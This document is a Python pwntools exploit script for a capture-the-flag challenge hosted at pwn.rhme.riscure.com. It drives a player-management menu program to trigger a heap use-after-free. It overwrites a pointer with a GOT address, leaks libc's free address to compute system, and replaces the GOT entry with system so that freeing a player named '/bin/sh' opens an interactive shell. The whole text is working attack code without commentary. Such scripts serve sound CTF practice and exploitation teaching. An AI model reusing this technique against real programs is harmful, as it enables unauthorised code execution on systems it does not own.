from pwn import *

#s = process("./main.elf")
s = remote("pwn.rhme.riscure.com", 1337)

def createPlayer(name, a,b,c,d):
	s.sendline("1")
	s.sendline(name)
	s.sendline("%d" % a)
	s.sendline("%d" % b)
	s.sendline("%d" % c)
	s.sendline("%d" % d)
	#s.clean()

def selectPlayer(i):
	s.sendline("3")
	s.sendline("%d" % i)
	s.clean()

def removePlayer(i):
	s.sendline("2")
	s.sendline("%d" % i)
	s.clean()

s.clean()

createPlayer("C"*0x17,1,1,1,1)
createPlayer("B"*0x40,1,1,1,1)
createPlayer("/bin/sh",9,9,9,9)

selectPlayer(0)
removePlayer(0)
removePlayer(1)

buf = "A"*0x10 + p64(0x603018)
createPlayer(buf, 2,2,2,2)
s.clean()

#get info
s.sendline("5")

s.recvuntil("Name: ")
buf = s.recvline()

freeptr = u64(buf[:-1].ljust(8,"\x00"))

#libc =  ELF("./libc.so.6")
libc =  ELF("./libc.so.remote")

libc.address= freeptr - libc.symbols['free']

print hex(libc.address)

print hex(libc.symbols['system'])

s.sendline("4")
s.sendline("1")
s.sendline(p64(libc.symbols['system']))
s.sendline("0")

s.sendline("2")
s.sendline("2")
s.clean()

s.interactive()
